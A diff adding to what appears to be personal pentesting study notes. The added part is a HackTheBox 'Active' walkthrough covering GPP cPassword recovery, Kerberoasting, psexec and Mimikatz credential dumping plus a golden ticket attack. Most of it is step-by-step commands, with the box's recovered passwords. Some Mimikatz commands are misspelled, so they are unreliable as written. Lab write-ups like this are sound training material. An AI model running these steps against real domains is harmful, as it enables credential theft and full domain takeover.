@@ -138,4 +138,145 @@ hashcat.exe -m 13100 <HashFile.txt> <PathToWordlist.txt> -O
 [+] Strong Password
 [+] Least Privilage(Don't Make Service Accounts Domain Admin)
 
-[*] 
+[*] GPP(Group Policy Preferances/MS14-025) / cPassword Attacks
+
+[*] GPP Allowed Admins To Create Policies Using Embeded Credentials. These Credentials Were Encrypted But The Key Was Accidently Released. This Has Been Patched In The MS14-025, And Is Rarely Found In Real-Life, This Still Exists.
+
+[*] Referance:
+
+https://www.rapid7.com/blog/post/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/
+
+[*] Attacking:
+
+[*] This Is A Bit Hard To Set Up In Our Lab, So We Are Going Back To HackTheBox
+[*] smb_enum_gpp Is The Module In Metasploit Which Is Used To Check If The Vulnerabity Exists
+
+[*] So, The Box Which We Are Going To Attack Is Active(From HackTheBox)
+[*] So Let's Start
+
+[*] Scanning And Enumeration
+
+[*] Some Ports Related To Active Directory Are Open(Like: domain, kerberos-sec, ldap, ldapssl)
+[*] SMB Is Also Open
+
+[*] Lets Connect
+
+smbclient -L \\\\<IP>\\
+
+[*] We Get To See 7 Shares
+[*] Lets Try To Connect
+
+[*] Attacking
+
+[*] Got Connection To Replication(As Anonymous)
+[*] Lets Run Two Commands:
+
+prompt off
+recurse on
+
+[*] Lets List. We Get To See A Groups.xml! That's Where The cPassword Is Stored!
+[*] Lets Get Them All
+
+mget *
+
+[*] Yes We Have The Groups.xml. Open It. And You See There Is Something After cpassword=(The Hash!). Copy It. (Note: We Also See: active.htb Which Is The Domain And SVC_TGS Which Is The Service)
+
+gpp-decrypt <Hash>
+
+[*] Get Got The Password! Lets Connect Using psexec
+
+psexec.py active.htb/svc_tgs:GPPstillStandingStrong2k18@<IP>
+
+[*] Connection Failed! We Are A Low-Privilage User!
+
+[*] As We Have Credentials For The svc_tgs(Ticket Granting Service), Let's Kerberoast
+
+GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip <IP> -request
+
+[*] We Get The Ticket!
+
+[*] Hashcat Now(On The Host):
+
+hashcat.exe -m 13100 <HashFile.txt> <PathToRockyou.txt> -O
+
+[*] Got The Password! Ticketmaster1968
+[*] This Is An Admin Account
+
+psexec.py active.htb/Administrator:Ticketmaster1968@<IP>
+
+[*] Got A Shell As Authority\System
+
+[*] Mimikatz
+
+https://github.com/gentilkiwi/mimikatz (We Dont Need This)
+
+
+[*] Mimikatz Is Used To View And Steal Passwords
+
+https://github.com/gentilkiwi/mimikatz/releases (Download This To The Domain Controller, As We Have Compromised It)
+
+[*] This May Show As A Harmful Site(As We Use Dangerous Codes To Hack :)
+
+[*] Download The ZIP File
+
+[*] Credential Dumping With mimikatz
+
+[*] Unzip The File On The Domain Controller And Open Up A Command Prompt In The Location Of The Extracted File. Now Run:
+
+mimikatz.exe
+
+[*] The First Command:
+
+privilage::debug
+
+[*] If The Output Is Privilage '20' OK, We Are Good To Go!
+
+[*] Dumping Credentials:
+
+sekurlsa::loginpasswords
+
+[*] This Will Show The Login Passwords
+
+[*] This May Dump The Sam(Not In This Case)
+
+lsadump::sam
+
+[*] This Will Dump The LSA File
+
+lsadump::lsa /patch
+
+[*] Golden Ticket Attacks
+
+[*] First Command:
+
+mimikatz.exe
+
+[*] Now:
+
+privilage::debug
+
+[*] Next:
+
+lsadump::lsa /inject /name:krbtgt
+
+[*] Now In A Text Editor, Copy The First Line After <Domainname> / <This Part> And The NTLM Hash Under Primary
+
+[*] The Final Command:
+
+kerberos::golden /User:<ANYNAME> /domain:<Domain>.local /sid:<The First Line That We Copied> /krbtgt:<The NTLM Hash> /id:500 /ptt
+
+[*] Success! Lets Connect To It
+
+misc::cmd
+
+[*] This Should Open A Shell! Now We Can Do Anything We Want To Do!
+[*] You Can Use psexec.exe To Connect To Any Machine!
+
+[*] Active Directory, Done!
+
+[*] References
+
+https://adsecurity.org/
+http://blog.harmj0y.net/
+https://www.pentesteracademy.com/activedirectorylab
+https://www.pentesteracademy.com/redteamlab
